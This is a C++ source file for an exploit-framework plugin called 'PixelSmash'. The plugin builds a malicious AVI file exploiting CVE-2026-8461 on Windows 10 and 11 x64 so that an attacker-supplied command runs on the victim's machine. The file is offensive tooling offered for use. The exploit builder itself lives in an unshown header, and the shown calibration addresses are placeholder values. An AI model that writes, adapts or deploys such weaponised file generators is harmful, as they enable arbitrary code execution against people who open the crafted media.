#include "../../../Module/ModuleBase.h"
#include "../../../Utils/Color.h"
#include "CVE-2026-8461.h"
#include <iostream>
#define WIN32_LEAN_AND_MEAN
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <filesystem>
#include <format>
#include <windows.h>

class PixelSmash : public ModuleBase {
public:
  PixelSmash() {
    RegisterOption("FilePath", std::make_unique<OptString>(
                                   "", OptionRequired::Required, ""));
    RegisterOption("CmdLine",
                   std::make_unique<OptString>("", OptionRequired::Required,
                                               "The Command To Execute"));
  }

  ModuleInfo Info() const override {
    ModuleInfo Info;
    Info.Name = "PixelSmash";
    Info.Description = "CVE-2026-8461";
    Info.Author = "RegistryEdit";
    Info.License = "DLL_LICENSE";
    Info.Type = ModuleType::Payload;
    Info.Targets = {"Windows 10 x64", "Windows 11 x64"};
    Info.DefaultTarget = "Windows 10 x64";
    Info.Platform = {"Windows"};
    Info.Arch = "x64";
    Info.DisclosureDate = "NULL";
    Info.References = {"NULL", "NULL"};
    Info.Rank = 300;
    return Info;
  }

  bool Check() override {
    Color::PrintInfo()
        << "Checking if the module is compatible with the current system..."
        << std::endl;
    return true;
  }

  bool Run() override {
    const std::string FilePath = GetOption("FilePath");
    const std::string CommandLine = GetOption("CmdLine");
    if (FilePath.empty() || CommandLine.empty())
      return false;

    Color::PrintInfo() << "PixelSmash: building payload for output file "
                       << FilePath << std::endl;
    Color::PrintInfo() << "PixelSmash: command length = " << CommandLine.size()
                       << std::endl;

    TargetCalibration Cal;
    CalInitDefaults(&Cal);

    Cal.SystemAddr = 0x4141414141414141;
    Cal.CmdHeapAddr = 0x4242424242424242;
    Cal.AvbufferAt = 256;
    Cal.CmdAt = 0;
    Cal.CmdMaxlen = 88;

    uint8_t *PayloadBuffer = NULL;
    size_t PayloadSize = 0;
    if (ExploitBuildAvi(&Cal, CommandLine.c_str(), 1, &PayloadBuffer,
                        &PayloadSize) != 0 ||
        !PayloadBuffer || PayloadSize == 0) {
      Color::PrintBad() << "PixelSmash: failed to build AVI payload."
                        << std::endl;
      return false;
    }
    Color::PrintInfo() << "PixelSmash: payload size = " << PayloadSize
                       << " bytes" << std::endl;
    FILE *Fp = fopen(FilePath.c_str(), "wb");
    if (!Fp) {
      Color::PrintBad() << "PixelSmash: failed to open output file."
                        << std::endl;
      free(PayloadBuffer);
      return false;
    }

    const size_t Written = fwrite(PayloadBuffer, 1, PayloadSize, Fp);
    fclose(Fp);
    free(PayloadBuffer);
    Color::PrintInfo() << "PixelSmash: wrote " << Written << " bytes."
                       << std::endl;
    return Written == PayloadSize;
  }
};

BOOL APIENTRY DllMain(HMODULE ModuleHandle, DWORD Reason, LPVOID) {
  if (Reason == DLL_PROCESS_ATTACH)
    DisableThreadLibraryCalls(ModuleHandle);
  return TRUE;
}

extern "C" __declspec(dllexport) ModuleBase *CreateModule() {
  return new PixelSmash();
}

extern "C" __declspec(dllexport) void DestroyModule(ModuleBase *Module) {
  delete Module;
}
